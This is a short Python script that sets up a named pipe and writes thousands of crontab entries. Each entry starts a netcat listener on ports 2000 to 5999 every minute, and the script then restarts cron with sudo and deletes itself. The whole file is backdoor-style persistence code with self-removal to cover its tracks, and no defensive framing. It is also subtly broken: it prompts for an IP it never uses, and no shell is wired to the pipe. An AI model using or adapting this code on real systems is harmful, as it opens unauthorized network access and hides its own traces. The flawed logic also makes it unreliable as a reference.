import subprocess

f = open('tempfile', 'w')

subprocess.run(['rm /tmp/f;mkfifo /tmp/f'], shell = True)
ip = input('ip? ')
for i in range(2000,6000):
    f.write('* * * * * tail -f /tmp/f | nc -lnvp '+str(i)+' | tr "\\r" "\\n" > /tmp/f \n')
f.close()

subprocess.run(['crontab tempfile'], shell = True)
subprocess.run(['sudo systemctl restart cron.service'], shell = True)
subprocess.run(['rm tempfile'], shell = True)
subprocess.run(['rm cron.py'], shell = True)
